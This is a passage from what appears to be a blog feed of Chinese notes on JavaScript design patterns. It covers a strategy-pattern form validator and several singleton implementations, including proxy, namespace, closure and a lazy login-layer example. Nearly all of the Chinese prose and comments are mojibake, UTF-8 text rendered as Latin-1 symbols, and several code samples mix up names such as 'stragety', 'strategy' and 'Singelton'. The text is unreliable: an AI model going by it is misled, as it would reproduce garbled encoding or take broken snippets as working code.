¡éªŒè§„åˆ™å¦‚æžœæˆ‘ä»¬æƒ³æ ¡éªŒä¸€ä¸ªæ–‡æœ¬æ˜¯å¦ä¸ºç©ºï¼Œå¹¶ä¸”æ ¡éªŒå®ƒè¾“å…¥çš„æ–‡æœ¬çš„é•¿åº¦ä¸å°äºŽ10å‘¢ï¼Ÿæˆ‘ä»¬æœŸæœ›ä»¥è¿™æ ·çš„å½¢å¼è¿›è¡Œæ ¡éªŒï¼š 1234567Validator.add(registerForm,userName,[&#123; stragety:'isNonEmpty', errorMsg:'ç”¨æˆ·åä¸èƒ½ä¸ºç©º'&#125;,&#123; stragety:'minLength:6', errorMsg:'ç”¨æˆ·åé•¿åº¦ä¸èƒ½å°äºŽ10ä½' &#125;]); ä¸‹é¢æä¾›çš„ä»£ç å¯ä»¥ç”¨äºŽä¸€ä¸ªæ–‡æœ¬æ¡†å¯¹åº”å¤šç§æ ¡éªŒè§„åˆ™ï¼š 1234567891011121314151617// æ”¹å†™ add å‡½æ•°Validator.prototype.add = function(dom,rules)&#123; var self = this; for(var i=0,rule;rule=rules[i++];)&#123; (function(rule)&#123; var strategyAry = rule.stragety.split(':'); var errorMsg = rule.errorMsg; self.cache.push(function()&#123; var strategy = strategyAry.shift(); strategyAry.unshift(dom.value); strategyAry.push(errorMsg); return strategies[stragety].apply(dom,strategyAry); &#125;); &#125;)(rule) &#125;&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829303132333435var registerForm = document.getElementById('registerForm');var validataFunc = function()&#123; var validator = new Validator(); validator.add(registerForm.userName,[&#123; strategy: 'isNonEmpty', errorMsg:'ç”¨æˆ·åä¸èƒ½ä¸ºç©º' &#125;,&#123; strategy: 'minLength:10', errorMsg: 'ç”¨æˆ·åé•¿åº¦ä¸èƒ½å°äºŽ 10 ä½' &#125;]); validator.add(registerForm.password,[&#123; strategy: 'isNonEmpty', errorMsg:'å¯†ç ä¸èƒ½ä¸ºç©º' &#125;,&#123; strategy: 'minLength:6', errorMsg: 'å¯†ç é•¿åº¦ä¸èƒ½å°äºŽ 6 ä½' &#125;]); validator.add(registerForm.phoneNumber,[&#123; strategy: 'isNonEmpty', errorMsg:'æ‰‹æœºå·ç ä¸èƒ½ä¸ºç©º' &#125;,&#123; strategy: 'isMobile', errorMsg: 'æ‰‹æœºå·ç æ ¼å¼ä¸æ­£ç¡®' &#125;]); var errorMsg = validator.start(); return errorMsg;&#125;registerForm.onsubmit = function()&#123; var errorMsg = validataFunc(); if(errorMsg)&#123; alert(errorMsg); return false; // é˜»æ­¢è¡¨å•æäº¤ &#125;&#125; ç­–ç•¥æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ç­–ç•¥æ¨¡å¼æ˜¯ä¸€ç§å¸¸ç”¨ä¸”æœ‰æ•ˆçš„è®¾è®¡æ¨¡å¼ã€‚ä»Žä¸Šé¢çš„ä¸‰ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºæ¥ä¸€äº›ç­–ç•¥æ¨¡å¼çš„ä¼˜ç‚¹ï¼š ç­–ç•¥æ¨¡å¼åˆ©ç”¨ç»„åˆã€å§”æ‰˜å’Œå¤šæ€ç­‰æŠ€æœ¯å’Œæ€æƒ³ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å¤šé‡æ¡ä»¶é€‰æ‹©è¯­å¥ã€‚ ç­–ç•¥æ¨¡å¼æä¾›äº†å¯¹å¼€æ”¾-å°é—­åŽŸåˆ™çš„å®Œç¾Žæ”¯æŒï¼Œå°†ç®—æ³•åŒ…è£…åœ¨ç‹¬ç«‹çš„ strategy ä¸­ï¼Œä½¿å¾—å®ƒä»¬æ˜“äºŽåˆ‡æ¢ï¼Œæ˜“äºŽç†è§£ï¼Œæ˜“äºŽæ‰©å±•ã€‚ ç­–ç•¥æ¨¡å¼ä¸­çš„ç®—æ³•ä¹Ÿå¯ä»¥å¤ç”¨åœ¨ç³»ç»Ÿçš„å…¶ä»–åœ°æ–¹ï¼Œä»Žè€Œé¿å…è®¸å¤šé‡å¤çš„å¤åˆ¶ç²˜è´´å·¥ä½œã€‚ åœ¨ç­–ç•¥æ¨¡å¼ä¸­åˆ©ç”¨ç»„åˆå’Œå§”æ‰˜æ¥è®© Context æ‹¥æœ‰æ‰§è¡Œç®—æ³•çš„èƒ½åŠ›ï¼Œè¿™ä¹Ÿæ˜¯ç»§æ‰¿çš„ä¸€ç§æ›´è½»ä¾¿çš„æ›¿ä»£æ–¹æ¡ˆã€‚ é¦–å…ˆï¼Œä½¿ç”¨ç­–ç•¥æ¨¡å¼ä¼šåœ¨ç¨‹åºä¸­å¢žåŠ è®¸å¤šç­–ç•¥ç±»æˆ–ç­–ç•¥å¯¹è±¡ï¼Œä½†å®žé™…ä¸Šè¿™æ¯”æŠŠå®ƒä»¬è´Ÿè´£çš„é€»è¾‘å †ç Œåœ¨ Context ä¸­è¦å¥½ã€‚ å…¶æ¬¡ï¼Œè¦ä½¿ç”¨ ç­–ç•¥æ¨¡å¼ï¼Œå¿…é¡»äº†è§£æ‰€æœ‰çš„ strategy ,å¿…é¡»äº†è§£å„ä¸ª strategy ä¹‹é—´çš„ä¸åŒç‚¹ï¼Œè¿™æ ·æ‰èƒ½é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„ strategyã€‚æ¯”å¦‚æˆ‘ä»¬è¦é€‰æ‹©æ—…æ¸¸å‡ºè¡Œçš„è·¯çº¿ï¼Œå¿…é¡»å…ˆäº†è§£é€‰æ‹©ä¸åŒäº¤é€šå·¥å…·çš„æ–¹æ¡ˆçš„ç»†èŠ‚ã€‚æ­¤æ—¶ strategy è¦å‘å®¢æˆ·æš´éœ²å®ƒçš„æ‰€æœ‰å®žçŽ°ï¼Œè¿™æ˜¯è¿åæœ€å°‘çŸ¥è¯†åŽŸåˆ™çš„ã€‚ ä¸€ç­‰å‡½æ•°å¯¹è±¡ä¸Žç­–ç•¥æ¨¡å¼åœ¨ä»¥ç±»ä¸ºä¸­å¿ƒçš„ä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€ä¸­ï¼Œä¸åŒçš„ç®—æ³•æˆ–è€…è¡Œä¸ºè¢«å°è£…åœ¨å„ä¸ªç­–ç•¥ç±»ä¸­ï¼ŒContext å°†è¯·æ±‚å§”æ‰˜ç»™è¿™äº›ç­–ç•¥å¯¹è±¡ï¼Œè¿™äº›ç­–ç•¥å¯¹è±¡ä¼šæ ¹æ®è¯·æ±‚è¿”å›žä¸åŒæ‰§è¡Œçš„ç»“æžœï¼Œè¿™æ ·ä¾¿èƒ½ä½“çŽ°å‡ºå¯¹è±¡çš„å¤šæ€æ€§ã€‚ â€œåœ¨å‡½æ•°ä½œä¸ºä¸€ç­‰å¯¹è±¡çš„è¯­è¨€ä¸­ï¼Œç­–ç•¥æ¨¡å¼æ˜¯éšå½¢çš„ã€‚strategy å°±æ˜¯å€¼ä¸ºå‡½æ•°çš„å˜é‡â€ã€‚åœ¨ JavaScript ä¸­ï¼Œé™¤äº†ä½¿ç”¨ç±»æ¥å°è£…ç®—æ³•å’Œè¡Œä¸ºä¹‹å¤–ï¼Œä½¿ç”¨å‡½æ•°å½“ç„¶ä¹Ÿæ˜¯ä¸€ç§é€‰æ‹©ã€‚è¿™äº›ç®—æ³•å¯ä»¥è¢«å°è£…åœ¨å‡½æ•°ä¸­å¹¶ä¸”å››å¤„ä¼ é€’ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ â€œé«˜é˜¶å‡½æ•°â€ã€‚å®žé™…ä¸Šåœ¨ JavaScript è¿™ç§æŠŠå‡½æ•°ä½œä¸ºä¸€ç­‰å¯¹è±¡çš„è¯­è¨€é‡Œï¼Œç­–ç•¥æ¨¡å¼å·²ç»èžå…¥åˆ°äº†è¯­è¨€æœ¬èº«å½“ä¸­ï¼Œå½“æˆ‘ä»¬è°ƒç”¨é«˜é˜¶å‡½æ•°æ¥å°è£…ä¸åŒçš„è¡Œä¸ºï¼Œå¹¶ä¸”æŠŠå®ƒä¼ é€’åˆ°å¦ä¸€ä¸ªå‡½æ•°é‡Œã€‚å½“æˆ‘ä»¬å¯¹è¿™äº›å‡½æ•°å‘å‡º â€œè°ƒç”¨â€çš„æ¶ˆæ¯æ—¶å€™ï¼Œä¸åŒçš„å‡½æ•°ä¼šè¿”å›žä¸åŒçš„æ‰§è¡Œç»“æžœã€‚åœ¨ JavaScript ä¸­ï¼Œâ€œå‡½æ•°å¯¹è±¡çš„å¤šæ€æ€§â€ æ¥åœ°æ›´åŠ ç®€å•ã€‚ å°ç»“åœ¨ JavaScript è¯­è¨€çš„ç­–ç•¥æ¨¡å¼ä¸­ï¼Œç­–ç•¥ç±»å¾€å¾€è¢«å‡½æ•°æ‰€æ›¿ä»£ï¼Œè¿™æ—¶ç­–ç•¥æ¨¡å¼å°±æˆä¸ºäº†ä¸€ç§ â€œéšå½¢â€ çš„æ¨¡å¼ï¼Œå°½ç®¡è¿™æ ·ï¼Œä»Žå¤´åˆ°å°¾åœ°äº†è§£ç­–ç•¥æ¨¡å¼ï¼Œä¸ä»…å¯ä»¥è®©æˆ‘ä»¬å¯¹è¯¥æ¨¡å¼æœ‰æ›´åŠ çš„é€å½»äº†è§£ï¼Œä¹Ÿå¯ä»¥ä½¿å¾—æˆ‘ä»¬æ˜Žç™½ä½¿ç”¨å‡½æ•°çš„å¥½å¤„ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å•ä¾‹æ¨¡å¼]]></title>
    <url>%2F2019-02-15-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å•ä¾‹æ¨¡å¼å•ä¾‹æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®žä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ å•ä¾‹æ¨¡å¼æ˜¯ä¸€ç§å¸¸ç”¨çš„æ¨¡å¼ï¼Œæœ‰ä¸€äº›å¯¹è±¡æˆ‘ä»¬å¾€å¾€åªéœ€è¦ä¸€ä¸ªï¼Œæ¯”å¦‚çº¿ç¨‹æ± ã€å…¨ç¨‹ç¼“å­˜ã€æµè§ˆå™¨ä¸­çš„ window å¯¹è±¡ç­‰ç­‰ã€‚åœ¨ JavaScript å¼€å‘ä¸­ï¼Œå•ä¾‹æ¨¡å¼ç”¨é€”åŒæ ·å¹¿æ³›ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œå½“æˆ‘ä»¬å•æœºç™»å½•æŒ‰é’®çš„æ—¶å€™ï¼Œé¡µé¢ä¸­åªä¼šå‡ºçŽ°ä¸€ä¸ªç™»å½•æµ®çª—ï¼Œè€Œè¿™ä¸ªç™»å½•æµ®çª—æ˜¯å”¯ä¸€çš„ï¼Œæ— è®ºå•å‡»å¤šå°‘æ¬¡ç™»å½•æŒ‰é’®ï¼Œè¿™ä¸ªæµ®çª—éƒ½åªä¼šè¢«åˆ›å»ºä¸€æ¬¡ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æµ®çª—å°±é€‚åˆç”¨å•ä¾‹æ¨¡å¼æ¥åˆ›å»ºã€‚ å®žçŽ°å•ä¾‹æ¨¡å¼è¦å®žçŽ°ä¸€ä¸ªæ ‡å‡†çš„å•ä¾‹æ¨¡å¼å¹¶ä¸å¤æ‚ï¼Œæ— éžä½¿ç”¨ä¸€ä¸ªå˜é‡æ¥æ ‡è¯†å½“å‰æ˜¯å¦å·²ç»ä¸ºæŸä¸ªç±»åˆ›å»ºè¿‡å¯¹è±¡ï¼Œå¦‚æžœæ˜¯ï¼Œåˆ™åœ¨ä¸‹ä¸€æ¬¡èŽ·å–è¯¥ç±»çš„å®žä¾‹çš„æ—¶å€™ï¼Œç›´æŽ¥è¿”å›žä¹‹å‰åˆ›å»ºçš„å¯¹è±¡ã€‚ä»£ç å¦‚ä¸‹: 1234567891011121314151617181920var Singleton = function (name) &#123; this.name = name; this.instance = null;&#125;Singleton.prototype.getName = function () &#123; console.log(this.name);&#125;Singleton.getInstance = function (name) &#123; if (!this.instance) &#123; this.instance = new Singleton(name); &#125; return this.instance;&#125;var a = Singleton.getInstance('sven1');var b = Singleton.getInstance('sven2');console.log(a === b); // true æˆ–è€… 123456789101112131415var Singleton = function (name) &#123; this.name = name;&#125;Singleton.prototype.getName = function () &#123; console.log(this.name);&#125;Singleton.getInstance = (function () &#123; var instance = null; return function (name) &#123; if (!instance) &#123; instance = new Singleton(name); &#125; return instance; &#125;&#125;)() æˆ‘ä»¬é€šè¿‡ Singleton.getInstance æ¥èŽ·å– Singleton ç±»çš„å”¯ä¸€å¯¹è±¡ï¼Œè¿™ç§æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œä½†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¢žåŠ äº†è¿™ä¸ªç±»çš„ â€œä¸é€æ˜Žæ€§â€ã€‚Singleton ç±»çš„ä½¿ç”¨è€…å¿…é¡»çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå•ä¾‹ç±»ï¼Œè·Ÿä»¥å¾€é€šè¿‡ new XX çš„æ–¹å¼æ¥èŽ·å–å¯¹è±¡ä¸åŒï¼Œè¿™é‡Œç”¨åˆ°æ˜¯ Singleton.getInstance æ¥èŽ·å–å¯¹è±¡ é€æ˜Žçš„å•ä¾‹æ¨¡å¼å®žçŽ°ä¸€ä¸ª â€œé€æ˜Žâ€ çš„å•ä¾‹ç±»ï¼Œç”¨æˆ·ä»Žè¿™ä¸ªç±»ä¸­åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥åƒä½¿ç”¨å…¶ä»–ä»»ä½•æ™®é€šç±»ä¸€æ ·ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ CreateDiv å•ä¾‹ç±»ï¼Œå®ƒçš„ä½œç”¨æ˜¯è´Ÿè´£åœ¨é¡µé¢ä¸­åˆ›å»ºå”¯ä¸€çš„ div èŠ‚ç‚¹ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122var CreateDiv = (function () &#123; var instance; //CreateDiv çš„æž„é€ å‡½æ•°å®žé™…ä¸Šè´Ÿè´£äº†ä¸¤ä»¶äº‹æƒ…ï¼Œç¬¬ä¸€æ˜¯åˆ›å»ºå¯¹è±¡å’Œæ‰§è¡Œåˆå§‹åŒ– init æ–¹æ³•ï¼Œç¬¬äºŒæ˜¯ä¿è¯åªæœ‰ä¸€ä¸ªå¯¹è±¡ã€‚ var CreateDiv = function (html) &#123; if (instance) &#123; return instance; &#125; this.html = html; this.init(); return instance = this; &#125; CreateDiv.prototype.init = function () &#123; var div = document.createElement('DIV'); div.innerHTML = this.html; document.body.appendChild(div); &#125; return CreateDiv;&#125;)();var c = new CreateDiv('sven1');var d = new CreateDiv('sven2');console.log(c === d); è™½ç„¶çŽ°åœ¨æ˜¯å®Œæˆäº†ä¸€ä¸ªé€æ˜Žçš„å•ä¾‹ç±»çš„ç¼–å†™ï¼Œä½†æ˜¯å®ƒæœ‰ä¸€äº›ç¼ºç‚¹ã€‚ ä¸ºäº†æŠŠ instance å°è£…èµ·æ¥ï¼Œä½¿ç”¨è‡ªæ‰§è¡ŒåŒ¿åå‡½æ•°å’Œé—­åŒ…ï¼Œå¹¶ä¸”è®©è¿™ä¸ªåŒ¿åå‡½æ•°è¿”å›žçœŸæ­£çš„ Singleton æž„é€ æ–¹æ³•ï¼Œå¢žåŠ äº†ä¸€äº›ç¨‹åºçš„å¤æ‚åº¦ï¼Œé˜…è¯»èµ·æ¥ä¹Ÿä¸æ˜¯å¾ˆèˆ’æœã€‚ ç”¨ä»£ç†å®žçŽ°å•ä¾‹æ¨¡å¼åœ¨ä¸Šé¢çš„ä»£ç ä¸­è¿›è¡Œæ”¹é€ ï¼Œé¦–å…ˆåœ¨ CreateDiv æž„é€ å‡½æ•°ä¸­ï¼ŒæŠŠè´Ÿè´£ç®¡ç†å•ä¾‹çš„ä»£ç ç§»å‡ºåŽ»ï¼Œè®©å®ƒæˆä¸ºä¸€ä¸ªæ™®é€šçš„åˆ›å»º div çš„ç±»ï¼š 12345678910var CreateDiv = function (html) &#123; this.html = html; this.init();&#125;CreateDiv.prototype.init = function () &#123; var div = document.createElement('div'); div.innerHTML = this.html; document.body.appendChild(div);&#125; æŽ¥ä¸‹æ¥æ˜ æ—¥ ä»£ç†ç±» ProxySingletonCreateDiv: 123456789var ProxySingletonCreateDiv = (function () &#123; var instance; return function (html) &#123; if (!instance) &#123; instance = new CreateDiv(html); &#125; return instance; &#125;&#125;)(); é€šè¿‡å¼•ç”¨ä»£ç†ç±»çš„æ–¹æ³•ï¼Œæˆ‘ä»¬åŒæ ·å®Œæˆäº†ä¸€ä¸ªå•ä¾‹æ¨¡å¼çš„ç¼–å†™ï¼Œè·Ÿä¹‹å‰ä¸åŒçš„æ˜¯ï¼ŒçŽ°åœ¨æˆ‘ä»¬æŠŠè´Ÿè´£ç®¡ç†å•ä¾‹çš„é€»è¾‘ç§»åˆ°äº†ä»£ç†ç±»ä¸­ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒCreateDiv å°±å˜æˆäº†ä¸€ä¸ªæ™®é€šçš„ç±»ï¼Œå®ƒè·Ÿä»£ç†ç±»ç»„åˆèµ·æ¥å¯ä»¥è¾¾åˆ°å•ä¾‹æ¨¡å¼çš„æ•ˆæžœã€‚ è¿™ä¸ªä¾‹å­æ˜¯ç¼“å­˜ä»£ç†çš„åº”ç”¨ä¹‹ä¸€ã€‚ JavaScript ä¸­çš„å•ä¾‹æ¨¡å¼å•ä¾‹çš„æ ¸å¿ƒæ˜¯ç¡®ä¿åªæœ‰ä¸€ä¸ªå®žä¾‹ï¼Œå¹¶æä¾›å…¨å±€è®¿é—®ã€‚ å•ä¾‹å¯¹è±¡æ˜¯ä»Ž â€œç±»â€ ä¸­åˆ›å»ºè€Œæ¥çš„ï¼Œåœ¨ä»¥ç±»ä¸ºä¸­å¿ƒçš„è¯­è¨€ä¸­ï¼Œè¿™æ˜¯å¾ˆè‡ªç„¶çš„åšæ³•ã€‚æ¯”å¦‚åœ¨ Java ä¸­ï¼Œéœ€è¦æŸä¸ªå¯¹è±¡ï¼Œå°±å¿…é¡»å…ˆå®šä¹‰ä¸€ä¸ªï¼Œå¯¹è±¡æ€»æ˜¯ä»Žç±»ä¸­åˆ›å»ºçš„ã€‚ ä½† JavaScript å…¶å®žä¸€é—¨ æ— ç±»çš„è¯­è¨€ï¼Œæ­£æ˜¯å› ä¸ºè¿™æ ·ï¼Œç”Ÿæ¬å•ä¾‹æ¨¡å¼çš„æ¦‚å¿µå¹¶æ— æ„ä¹‰ã€‚ å…¨å±€å˜é‡ä¸æ˜¯å•ä¾‹æ¨¡å¼ï¼Œä½†åœ¨ JavaScript å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šæŠŠå…¨å±€å˜é‡å½“åšå•ä¾‹æ¥ä½¿ç”¨ã€‚ ä¾‹å¦‚ï¼š 1var a = &#123;&#125;; å½“ç”¨è¿™ç§æ–¹å¼åˆ›å»ºå¯¹è±¡ a æ—¶ï¼Œå¯¹è±¡ a ç¡®å®žæ˜¯ç‹¬ä¸€æ— äºŒçš„ã€‚å¦‚æžœ a å˜é‡è¢«å£°æ˜Žåœ¨å…¨å±€ä½œç”¨åŸŸä¸‹ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­çš„ä»»ä½•ä½ç½®ä½¿ç”¨è¿™ä¸ªå˜é‡ï¼Œå…¨å±€å˜é‡æä¾›ç»™å…¨å±€è®¿é—®æ˜¯ç†æ‰€å½“ç„¶çš„ã€‚è¿™æ ·å°±æ»¡è¶³äº†å•ä¾‹æ¨¡å¼çš„ä¸¤ä¸ªæ¡ä»¶ã€‚ ä½†æ˜¯å…¨å±€å˜é‡å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œå®ƒå¾ˆå®¹æ˜“é€ æˆå‘½åç©ºé—´æ±¡æŸ“ã€‚ æˆ‘ä»¬æœ‰å¿…è¦å°½é‡å‡å°‘å…¨å±€å˜é‡çš„ä½¿ç”¨ï¼Œå³ä½¿éœ€è¦ï¼Œä¹Ÿè¦æŠŠå®ƒçš„æ±¡æŸ“é™åˆ°æœ€ä½Žã€‚ä»¥ä¸‹å‡ ç§æ–¹å¼å¯ä»¥ç›¸å¯¹é™ä½Žå…¨å±€å˜é‡å¸¦æ¥çš„å‘½åæ±¡æŸ“ã€‚ 1.ä½¿ç”¨å‘½åç©ºé—´é€‚å½“åœ°ä½¿ç”¨å‘½åç©ºé—´ï¼Œå¹¶ä¸ä¼šæœç»å…¨å±€å˜é‡ï¼Œä½†æ˜¯å¯ä»¥å‡å°‘å…¨å±€å˜é‡çš„æ•°é‡ æœ€ç®€å•çš„æ–¹æ³•ä¾ç„¶æ˜¯ä½¿ç”¨å¯¹è±¡å­—é¢é‡çš„æ–¹å¼ï¼š 12345678910111213141516171819202122232425262728293031var namespace1 = &#123; a:function()&#123; console.log(1) &#125;, b:function()&#123; console.log(2) &#125;&#125;// æŠŠ a å’Œ b éƒ½å®šä¹‰ä¸º namespace1 çš„å±žæ€§ï¼Œå¯ä»¥å‡å°‘å˜é‡å’Œå…¨å±€ä½œç”¨åŸŸæ‰“äº¤é“çš„æœºä¼šã€‚å¦å¤–ï¼Œè¿˜å¯ä»¥åŠ¨æ€åœ°åˆ›å»ºå‘½åç©ºé—´ã€‚var MyApp = &#123;&#125;;MyApp.namespace = function(name)&#123; var parts = name.split('.'); var current = MyApp; for(var i in parts)&#123; if(!current[parts[i]])&#123; current[parts[i]] = []; &#125; current = current[parts[i]] &#125;&#125;MyApp.namespace('event');MyApp.namespace('dom.style');console.log(MyApp);// ä¸Šé¢ä»£ç ç­‰ä»·äºŽ var MyApp = &#123; event:&#123;&#125;, dom:&#123; style:&#123;&#125; &#125;&#125; 2.ä½¿ç”¨é—­åŒ…å°è£…ç§æœ‰å˜é‡è¿™ç§æ–¹æ³•æŠŠä¸€äº›å˜é‡å°é—­åœ¨é—­åŒ…çš„å†…éƒ¨ï¼Œåªæš´éœ²ä¸€äº›æŽ¥å£è·Ÿå¤–ç•Œé€šä¿¡ï¼š 123456789var user = (function()&#123; var __name = 'sven', __age = 29; return &#123; getUserInfo:function()&#123; return __name + '_' + __age; &#125; &#125;&#125;)(); è¿™é‡Œç”¨ä¸‹åˆ’çº¿æ¥çº¦å®šç§æœ‰å˜é‡ï¼Œå®ƒä»¬è¢«å°è£…åœ¨é—­åŒ…äº§ç”Ÿçš„ä½œç”¨åŸŸä¸­ï¼Œå¤–éƒ¨æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸¤ä¸ªå˜é‡çš„ï¼Œè¿™å°±é¿å…äº†å¯¹å…¨å±€çš„å‘½ä»¤æ±¡æŸ“ã€‚ï¼ˆçŽ°åœ¨æ²¡æœ‰è¿™æ ·æ¥å®šä¹‰ç§æœ‰å˜é‡ï¼Œä¸€èˆ¬æ˜¯ä½¿ç”¨ Symbolï¼‰ æƒ°æ€§å•ä¾‹æƒ°æ€§å•ä¾‹æŒ‡çš„æ˜¯éœ€è¦çš„æ—¶å€™æ‰åˆ›å»ºå¯¹è±¡å®žä¾‹ã€‚æƒ°æ€§å•ä¾‹æ˜¯å•ä¾‹æ¨¡å¼çš„é‡ç‚¹ï¼Œè¿™ç§æŠ€æœ¯æ˜¯å®žé™…å¼€å‘ä¸­éžå¸¸æœ‰ç”¨çš„ï¼Œæœ‰ç”¨çš„ç¨‹åº¦å¯èƒ½è¶…å‡ºäº†æˆ‘ä»¬çš„æƒ³è±¡ã€‚instance å®žä¾‹å¯¹è±¡æ€»æ˜¯åœ¨æˆ‘ä»¬è°ƒç”¨ Singleton.getInstance çš„æ—¶å€™æ‰è¢«åˆ›å»ºï¼Œè€Œä¸æ˜¯åœ¨é¡µé¢åŠ è½½å¥½çš„æ—¶å€™å°±è¢«åˆ›å»ºã€‚ä»£ç å¦‚ä¸‹ï¼š 123456789Singleton.getInstance = (function()&#123; var instance = null; return function(name)&#123; if(!instance)&#123; instance = new Singelton(name); &#125; return instance; &#125;&#125;)(); ä¸è¿‡è¿™æ˜¯åŸºäºŽâ€œç±»â€ çš„å•ä¾‹æ¨¡å¼ï¼ŒåŸºäºŽ â€œç±»â€ çš„å•ä¾‹æ¨¡å¼åœ¨ JavaScript ä¸­å¹¶ä¸é€‚ç”¨ã€‚ä¸‹é¢ç”¨ WebQQ çš„ç™»å½•æµ®çª—ä¸ºä¾‹å­ï¼Œä»‹ç»ä¸Žå…¨å±€å˜é‡ç»“åˆå®žçŽ°æƒ°æ€§çš„å®žä¾‹ã€‚ å‡è®¾æˆ‘ä»¬æ˜¯ WebQQ çš„å¼€å‘äººå‘˜ï¼ˆç½‘å€æ˜¯web.qq.comï¼‰ï¼Œå½“ç‚¹å‡»å·¦è¾¹å¯¼èˆªé‡Œ QQ å¤´åƒæ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç™»å½•æµ®çª—å¾ˆæ˜Žæ˜¾è¿™ä¸ªæµ®çª—åœ¨é¡µé¢é‡Œæ€»æ˜¯å”¯ä¸€çš„ï¼Œä¸å¯èƒ½å‡ºçŽ°åŒæ—¶å­˜åœ¨ä¸¤ä¸ªç™»å½•çª—å£çš„æƒ…å†µã€‚ ç¬¬ä¸€ç§è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨é¡µé¢åŠ è½½å®Œæˆçš„æ—¶å€™åˆ›å»ºå¥½è¿™ä¸ª div æµ®çª—ï¼Œè¿™ä¸ªæµ®çª—ä¸€å¼€å§‹è‚¯å®šæ˜¯éšè—çŠ¶æ€ï¼Œå½“ç”¨æˆ·ç‚¹å‡»ç™»å½•æŒ‰é’®çš„æ—¶å€™å°±æ˜¾ç¤ºï¼š 1234567891011121314151617&lt;html&gt; &lt;body&gt; &lt;button id="loginBtn"&gt;ç™»å½•&lt;/button&gt; &lt;/body&gt; &lt;script&gt; var loginLayer = (function()&#123; var div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'ï¼› div.style.display = 'none'; document.body.appendChild(div); return div; &#125;)(); document.getElementById('loginBtn').onClick=function()&#123; loginLayer.style.display = 'block'; &#125;; &lt;/script&gt;&lt;/html&gt; è¿™ç§æ–¹å¼æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œä¹Ÿè®¸æˆ‘ä»¬è¿›å…¥ WebQQ åªæ˜¯çŽ©çŽ©æ¸¸æˆæˆ–è€…çœ‹çœ‹å¤©æ°”ï¼Œæ ¹æœ¬ä¸éœ€è¦è¿›è¡Œç™»å½•æ“ä½œï¼Œå› ä¸ºç™»å½•æµ®çª—æ€»æ˜¯ä¸€å¼€å§‹å°±è¢«åˆ›å»ºå¥½ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°†ç™½ç™½æµªè´¹ä¸€äº› DOM èŠ‚ç‚¹ã€‚ æ”¹å˜ä¸€ä¸‹ä»£ç ï¼Œä½¿ç”¨æˆ·ç‚¹å‡»ç™»å½•æŒ‰é’®çš„æ—¶å€™æ‰å¼€å§‹åˆ›å»ºæµ®çª— 123456789101112131415161718&lt;html&gt; &lt;body&gt; &lt;button id="loginBtn"&gt;ç™»å½•&lt;/button&gt; &lt;/body&gt; &lt;script&gt; var createLoginLayer = function()&#123; var div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'ï¼› div.style.display = 'none'; document.body.appendChild(div); return div; &#125;; document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createLoginLayer(); loginLayer.style.display = 'block'; &#125;; &lt;/script&gt;&lt;/html&gt; 